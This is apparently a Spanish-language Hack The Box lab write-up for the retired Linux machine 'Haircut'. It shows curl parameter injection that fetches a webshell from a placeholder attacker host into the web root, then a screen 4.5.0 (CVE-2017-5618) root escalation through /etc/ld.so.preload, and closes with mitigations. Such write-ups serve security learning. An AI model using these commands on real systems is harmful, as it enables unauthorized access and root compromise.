---
machine: Haircut
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, php, curl, parameter-injection, screen, privesc]
---

# Haircut — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`exposed.php` pasa la URL del usuario a `curl` sin sanear. Una inyección de parámetros escribe un webshell en `uploads/` y da `www-data`. La versión SUID de `screen` 4.5.0 es vulnerable a CVE-2017-5618: se escribe `/etc/ld.so.preload` y se obtiene una shell SUID de root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` nginx con una web de peluquería.
- `gobuster` encuentra `/exposed.php`, `/uploads` y `/upload.php`.
- `exposed.php` tiene un formulario que pide una URL y ejecuta `curl`.

## Enumeración

El código equivalente es:

```php
system('curl ' . $_POST["formurl"] . ' /path/to/some/directory');
```

La entrada no se valida, así que se pueden inyectar opciones de `curl`.

## Foothold

Se usa `-o` para escribir un webshell en el directorio servido.

```bash
curl -X POST http://<IP>/exposed.php \
  --data-urlencode 'formurl=http://<ATTACKER>/shell.php -o /var/www/html/uploads/shell.php' \
  --data-urlencode 'submit=go'
```

Después se visita `/uploads/shell.php?cmd=id` y se obtiene `www-data`.

## Movimiento lateral

No hay un salto de usuario intermedio; la shell de `www-data` es suficiente para la escalada.

## Escalada de privilegios

`screen` 4.5.0 es SUID. CVE-2017-5618 permite escribir en `/etc/ld.so.preload` usando `-L` y luego cargar una biblioteca maliciosa cuando `screen` se ejecuta de nuevo. La biblioteca crea `/tmp/rootshell` SUID.

```bash
screen-4.5.0 -D -m -L ld.so.preload echo -ne '\x0a/tmp/libhax.so'
screen-4.5.0 -ls
/tmp/rootshell
```

## Evidencia

- `exposed.php` y `curl` sin sanear.
- Webshell en `uploads/`.
- `screen` SUID y CVE-2017-5618.
- `/etc/ld.so.preload` y root.

## Lecciones aprendidas

- Pasar entrada a `curl` permite inyectar opciones y escribir archivos.
- Un webshell en un directorio servido es ejecución directa.
- Un binario SUID vulnerable puede escalar desde `www-data`.
- `ld.so.preload` es un objetivo clásico de escalada.

## Mitigación y detección

- Usar `escapeshellarg` o una lista blanca de URLs.
- No permitir escritura en directorios servidos.
- Actualizar `screen` y revisar binarios SUID.
- Monitorizar cambios en `/etc/ld.so.preload`.

## Referencias

- [0xdf — Haircut](https://0xdf.gitlab.io/2020/09/10/htb-haircut.html)
- [IppSec — Haircut](https://www.youtube.com/watch?v=9ZXG1qb8lUI)
- [Hack The Box — Haircut](https://app.hackthebox.com/machines/haircut)
